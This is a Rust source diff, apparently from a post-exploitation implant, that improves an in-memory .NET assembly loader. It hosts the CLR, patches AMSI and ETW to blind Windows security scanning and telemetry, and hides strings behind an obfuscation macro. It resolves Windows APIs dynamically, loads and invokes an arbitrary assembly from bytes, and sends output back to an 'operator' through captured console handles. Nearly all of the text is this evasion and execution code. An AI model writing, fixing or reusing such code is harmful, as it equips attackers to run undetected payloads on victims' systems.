@@ -532,10 +532,10 @@ pub fn run_helper() -> i32 {
     };
     let (stdout, stderr) = crate::md::execass::clr::invoke_in_process(&request, &parsed_args);
     if !stdout.is_empty() {
-        print!("{}", stdout);
+        clr::write_orig_stdout(&stdout);
     }
     if !stderr.is_empty() {
-        eprint!("{}", stderr);
+        clr::write_orig(&format!("{}", stderr));
     }
     0
 }
@@ -601,6 +601,12 @@ pub mod clr {
         data3: 0x11d2,
         data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
     };
+    const IID_APP_DOMAIN: Guid = Guid {
+        data1: 0x05f696dc,
+        data2: 0x2b29,
+        data3: 0x3663,
+        data4: [0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13],
+    };
 
     const VT_EMPTY: u16 = 0;
     const VT_BSTR: u16 = 8;
@@ -657,6 +663,43 @@ pub mod clr {
     }
 
     static mut HOST: Option<HostState> = None;
+    static mut ORIG_STDOUT: Raw = std::ptr::null_mut();
+    static mut ORIG_STDERR: Raw = std::ptr::null_mut();
+    pub(crate) fn write_orig(text: &str) {
+        unsafe {
+            if ORIG_STDERR.is_null() {
+                eprint!("{}", text);
+                return;
+            }
+            write_all_handle(ORIG_STDERR, text.as_bytes());
+        }
+    }
+
+    pub(crate) fn write_orig_stdout(text: &str) {
+        unsafe {
+            if ORIG_STDOUT.is_null() {
+                print!("{}", text);
+                return;
+            }
+            write_all_handle(ORIG_STDOUT, text.as_bytes());
+        }
+    }
+
+    unsafe fn write_all_handle(handle: Raw, mut bytes: &[u8]) {
+        let Ok(proc) = resolve(&crate::ob!("kernel32.dll"), &crate::ob!("WriteFile")) else {
+            return;
+        };
+        let write_file: unsafe extern "system" fn(Raw, *const u8, u32, *mut u32, *mut c_void) -> i32 =
+            std::mem::transmute(proc);
+        while !bytes.is_empty() {
+            let mut written: u32 = 0;
+            if write_file(handle, bytes.as_ptr(), bytes.len() as u32, &mut written, std::ptr::null_mut()) == 0 || written == 0 {
+                return;
+            }
+            bytes = &bytes[written as usize..];
+        }
+    }
+
     static mut STDOUT_BUFFER: Option<std::sync::Mutex<Vec<u8>>> = None;
     static mut STDERR_BUFFER: Option<std::sync::Mutex<Vec<u8>>> = None;
     static mut STDOUT_WRITE: Raw = std::ptr::null_mut();
@@ -717,6 +760,13 @@ pub mod clr {
         {
             return Err(crate::ob!("CreatePipe failed").to_string());
         }
+
+        let get_std_handle: unsafe extern "system" fn(i32) -> Raw =
+            std::mem::transmute(resolve(&kernel32, &crate::ob!("GetStdHandle"))?);
+        // Grab the real console/ssh handles before swapping so Rust-side output
+        // keeps flowing to the operator (Go caches these at runtime startup).
+        ORIG_STDOUT = get_std_handle(-11);
+        ORIG_STDERR = get_std_handle(-12);
 
         let set_std_handle: unsafe extern "system" fn(i32, Raw) -> i32 =
             std::mem::transmute(resolve(&kernel32, &crate::ob!("SetStdHandle"))?);
@@ -941,48 +991,90 @@ pub mod clr {
         (stdout, stderr)
     }
 
+    fn step(debug: bool, message: &str) {
+        if debug {
+            super::clr::write_orig(&format!("{} {}\n", crate::ob!("[INF]"), message));
+        }
+    }
+
+    fn hr_text(hr: i32) -> String {
+        format!("0x{:08x}", hr as u32)
+    }
+
     pub fn invoke_in_process(request: &super::Request, parsed_args: &[String]) -> (String, String) {
         unsafe {
-            if let Err(error) = patch_amsi_etw(request.debug) {
-                return (String::new(), format!("{}{}", crate::ob!("failed to load CLR: "), error));
+            let dbg = request.debug;
+            step(dbg, &crate::ob!("patching amsi/etw").to_string());
+            if std::env::var_os("FURY_NO_AMSI_PATCH").is_none() {
+                if let Err(error) = patch_amsi_etw(request.debug) {
+                    return (String::new(), format!("{}{}", crate::ob!("failed to load CLR: "), error));
+                }
+                step(dbg, &crate::ob!("amsi/etw patched").to_string());
+            } else {
+                step(dbg, "amsi patch SKIPPED");
             }
+            step(dbg, &crate::ob!("loading clr").to_string());
             let state = match load_clr(&request.runtime) {
                 Ok(state) => state,
                 Err(error) => return (String::new(), format!("{}{}", crate::ob!("failed to load CLR: "), error)),
             };
+            step(dbg, &crate::ob!("clr loaded").to_string());
             if STDOUT_WRITE.is_null() {
+                step(dbg, &crate::ob!("redirecting output").to_string());
                 if let Err(error) = redirect_output() {
                     return (String::new(), error);
                 }
+                step(dbg, &crate::ob!("output redirected").to_string());
             }
 
             // ICorRuntimeHost::GetDefaultDomain (slot 13) -> _AppDomain.
             let get_default_domain: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(state.host, 13));
             let mut app_domain: Raw = std::ptr::null_mut();
-            if get_default_domain(state.host, &mut app_domain) != 0 {
+            let hr = get_default_domain(state.host, &mut app_domain);
+            step(dbg, &format!("GetDefaultDomain hr={}", hr_text(hr)));
+            if hr != 0 || app_domain.is_null() {
                 return (String::new(), crate::ob!("failed to get the default app domain").to_string());
             }
 
+            // GetDefaultDomain yields an IUnknown; QueryInterface it to the
+            // _AppDomain dispatch interface before using its vtable slots
+            // (go-clr does the same, otherwise Load_3 faults inside clr.dll).
+            let query_interface: unsafe extern "system" fn(Raw, *const Guid, *mut Raw) -> Hresult =
+                std::mem::transmute::<Raw, _>(slot(app_domain, 0));
+            let mut domain: Raw = std::ptr::null_mut();
+            let hr = query_interface(app_domain, &IID_APP_DOMAIN, &mut domain);
+            step(dbg, &format!("QueryInterface(_AppDomain) hr={}", hr_text(hr)));
+            if hr != 0 || domain.is_null() {
+                return (String::new(), crate::ob!("failed to get the _AppDomain interface").to_string());
+            }
+            app_domain = domain;
+
+            step(dbg, &format!("artifact len={}", request.artifact.len()));
             let raw_array = match byte_array_to_safe_array(&request.artifact) {
                 Ok(array) => array,
                 Err(error) => return (String::new(), error),
             };
+            step(dbg, "safearray created");
             // _AppDomain::Load_3 (slot 45) -> Assembly.
+            step(dbg, "calling Load_3");
             let load_3: unsafe extern "system" fn(Raw, Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(app_domain, 45));
             let mut assembly: Raw = std::ptr::null_mut();
-            if load_3(app_domain, raw_array, &mut assembly) != 0 {
-                safe_array_destroy(raw_array);
+            let hr = load_3(app_domain, raw_array, &mut assembly);
+            step(dbg, &format!("Load_3 hr={}", hr_text(hr)));
+            safe_array_destroy(raw_array);
+            if hr != 0 || assembly.is_null() {
                 return (String::new(), crate::ob!("failed to load assembly").to_string());
             }
-            safe_array_destroy(raw_array);
 
             // _Assembly::GetEntryPoint (slot 16) -> MethodInfo.
             let get_entry_point: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(assembly, 16));
             let mut method_info: Raw = std::ptr::null_mut();
-            if get_entry_point(assembly, &mut method_info) != 0 {
+            let hr = get_entry_point(assembly, &mut method_info);
+            step(dbg, &format!("GetEntryPoint hr={}", hr_text(hr)));
+            if hr != 0 || method_info.is_null() {
                 return (String::new(), crate::ob!("failed to get the assembly entry point").to_string());
             }
 
@@ -991,8 +1083,12 @@ pub mod clr {
                 std::mem::transmute::<Raw, _>(slot(method_info, 7));
             let mut signature_ptr: *const u16 = std::ptr::null();
             let mut signature = String::new();
-            if to_string(method_info, &mut signature_ptr) == 0 {
+            let hr = to_string(method_info, &mut signature_ptr);
+            if hr == 0 {
                 signature = read_wide(signature_ptr);
+                step(dbg, &format!("sig={}", signature));
+            } else {
+                step(dbg, &format!("ToString hr={}", hr_text(hr)));
             }
 
             let mut param_array: Raw = std::ptr::null_mut();
@@ -1003,7 +1099,7 @@ pub mod clr {
             }
 
             let null_variant = Variant {
-                vt: VT_EMPTY,
+                vt: 1, // VT_NULL, matching go-clr
                 reserved: [0; 3],
                 value: 0,
                 extra: [0; 8],
@@ -1011,8 +1107,10 @@ pub mod clr {
             // MethodInfo::Invoke_3 (slot 37).
             let invoke_3: unsafe extern "system" fn(Raw, Variant, Raw) -> Hresult =
                 std::mem::transmute::<Raw, _>(slot(method_info, 37));
+            let hr = invoke_3(method_info, null_variant, param_array);
+            step(dbg, &format!("Invoke_3 hr={}", hr_text(hr)));
             let mut invoke_error = String::new();
-            if invoke_3(method_info, null_variant, param_array) != 0 {
+            if hr != 0 {
                 invoke_error = crate::ob!("the MethodInfo::Invoke_3 method returned an error").to_string();
             }
             safe_array_destroy(param_array);
